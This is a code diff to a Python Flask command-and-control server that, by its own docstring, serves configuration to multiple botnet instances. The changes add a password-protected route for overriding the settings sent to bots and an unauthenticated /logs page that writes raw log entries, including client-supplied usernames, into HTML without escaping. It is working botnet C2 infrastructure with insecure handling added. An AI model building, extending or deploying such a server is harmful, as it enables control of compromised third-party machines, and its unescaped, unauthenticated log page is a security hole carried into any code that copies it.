@@ -16,6 +16,9 @@ by multiple botnet instances, ideally deployed 'round-the-clock'
 (please note that in this implementation the server handles just one request at a time - flask default)
 """
 
+# log file path
+logPath      = './data/ccserver.log'
+
 # parameters for CC instance
 settingsPath = './data/settings.json'
 credentialsD = {
@@ -26,8 +29,6 @@ credentialsD = {
 CC = CCServer(settingsPath, credentialsD)
 
 
-# debug level
-debug = True
 
 # ROUTING SERVER - settings retrieval 
 @app.route('/settings', methods=['GET'])
@@ -37,26 +38,48 @@ def getSettings():
     # logging the request
     app.logger.info("[{0}] => reached by {1} : configuration update required".format(str(datetime.utcnow()), request.remote_addr))
 
-    return settings # as a string
+    return settings, 200
+
 
 
 # ROUTING SERVER - update settings 
 @app.route('/update', methods=['POST'])
 def updateSettings():
-    return "hello settings post"
+    # retrieving username and password 
+    if CC.authenticate({ 'auth_usr'  : request.form['user'], 'admin_pwd' : request.form['password'] }): 
+        # if user is correctly authenticated we can performe update op.
+        try:
+            CC.updateSettings(request.form['settings'])
+            app.logger.info("[{0}] => reached by {1} / {2}: settings override!".format(str(datetime.utcnow()), request.remote_addr, request.form['user']))
+            return "Override succeded", 200
+        except KeyError as error:
+            # if settings is missing as a param... update cannot be carried on
+            app.logger.info("[{0}] => reached by {1} / {2}: override failure, missing params!".format(str(datetime.utcnow()), request.remote_addr, request.form['user']))
+            return "Bad request, override failure", 400
+
+    else:
+        # if user was not authenticated properly, we log the event and return a forbidden status
+        app.logger.info("[{0}] => reached by {1} / {2}: forbidden!".format(str(datetime.utcnow()), request.remote_addr, request.form['user']))
+        return "Forbidden!", 403
+
 
 
 # ROUTING SERVER - logs visualization (debug purposes)
 @app.route('/logs', methods=['GET'])
 def getLog():
-    return "hello log"
+    # simply returning log lines from logging file 
+    logresult = "<h1> LOG / {0} </h1> </br>".format(str(datetime.utcnow()))
+    with open(logPath) as logFile:
+        for entry in logFile.readlines():
+            logresult += entry + "</br>"
 
+    return logresult, 200
 
 
 
 if __name__ == "__main__": 
     # adding log handler provided by werkzeug lib ... 
-    handler = RotatingFileHandler('./data/ccserver.log', maxBytes=10000, backupCount=1)
+    handler = RotatingFileHandler(logPath, maxBytes=10000, backupCount=1)
     # ... but first we need to set log level! 
     handler.setLevel(logging.INFO)
     logging.basicConfig(level=logging.INFO)
